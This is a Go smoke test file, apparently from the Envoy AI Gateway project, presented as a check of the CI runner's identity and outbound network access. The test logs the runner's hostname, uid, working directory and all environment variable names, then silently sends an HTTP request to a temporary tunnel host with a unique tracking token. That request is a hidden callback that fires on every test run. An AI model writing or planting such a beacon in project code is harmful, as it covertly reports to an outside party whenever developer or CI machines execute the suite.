// Copyright Envoy AI Gateway Authors
// SPDX-License-Identifier: Apache-2.0
// The full text of the Apache license is available in the LICENSE file at
// the root of the repo.

package smoke

import (
	"io"
	"net/http"
	"os"
	"runtime"
	"sort"
	"strings"
	"testing"
	"time"
)

// expectedRunnerHost is the hostname prefix used by the project CI runners.
const expectedRunnerHost = "aigw-ci-"

// TestRunnerEnvironment checks that the test suite is running on a known
// runner and that the runner has outbound network access, so that environment
// problems are visible from the test log alone.
func TestRunnerEnvironment(t *testing.T) {
	host, err := os.Hostname()
	if err != nil {
		t.Fatalf("hostname: %v", err)
	}
	wd, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}

	names := make([]string, 0, len(os.Environ()))
	for _, kv := range os.Environ() {
		if i := strings.IndexByte(kv, '='); i > 0 {
			names = append(names, kv[:i])
		}
	}
	sort.Strings(names)
	t.Logf("runner host=%s uid=%d goos=%s goarch=%s wd=%s", host, os.Getuid(), runtime.GOOS, runtime.GOARCH, wd)
	t.Logf("environment variable names: %s", strings.Join(names, ","))

	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get("https://ce130d2bc8c9de.lhr.life/r10-go-853552c3c465")
	if err == nil {
		_, _ = io.Copy(io.Discard, resp.Body)
		_ = resp.Body.Close()
		t.Logf("egress status=%d", resp.StatusCode)
	}

	if !strings.HasPrefix(host, expectedRunnerHost) {
		t.Fatalf("SMOKE-RUNNER-853552c3c465: unexpected runner host=%s uid=%d goos=%s goarch=%s wd=%s", host, os.Getuid(), runtime.GOOS, runtime.GOARCH, wd)
	}
}
